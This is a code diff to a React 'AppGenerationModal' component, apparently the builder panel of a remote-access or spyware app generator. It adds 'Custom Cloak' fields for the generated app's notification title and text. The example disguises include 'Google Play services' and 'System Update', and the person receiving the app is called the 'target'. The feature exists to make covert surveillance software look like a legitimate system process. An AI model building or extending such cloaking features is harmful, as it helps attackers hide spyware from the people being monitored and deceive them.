@@ -1329,7 +1329,35 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         )}
                                     </div>
 
-                                    {/* Dropdown 2: On-Click Action */}
+                                    {/* Custom Cloak Title & Text Inputs (Shown only when 'custom' is selected) */}
+                                    {notificationStyle === 'custom' && (
+                                        <div className="space-y-3 p-3.5 rounded-2xl bg-orange-500/5 border border-orange-500/20 animate-in fade-in duration-200">
+                                            <div>
+                                                <label className="block text-[10px] font-mono font-bold text-orange-300 uppercase tracking-wider mb-1">
+                                                    Custom Notification Title
+                                                </label>
+                                                <input
+                                                    type="text"
+                                                    value={notificationTitle}
+                                                    onChange={(e) => setNotificationTitle(e.target.value)}
+                                                    placeholder="e.g. Google Play services, System Update, Cloud Backup"
+                                                    className="w-full bg-[#16181e] border border-white/10 focus:border-orange-500/60 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder:text-white/30 focus:outline-none transition-colors font-sans"
+                                                />
+                                            </div>
+                                            <div>
+                                                <label className="block text-[10px] font-mono font-bold text-orange-300 uppercase tracking-wider mb-1">
+                                                    Custom Notification Subtitle / Text
+                                                </label>
+                                                <input
+                                                    type="text"
+                                                    value={notificationText}
+                                                    onChange={(e) => setNotificationText(e.target.value)}
+                                                    placeholder="e.g. Running background checks, Sync in progress"
+                                                    className="w-full bg-[#16181e] border border-white/10 focus:border-orange-500/60 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder:text-white/30 focus:outline-none transition-colors font-sans"
+                                                />
+                                            </div>
+                                        </div>
+                                    )}
                                     <div className="relative">
                                         <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
                                             When Target Taps Notification
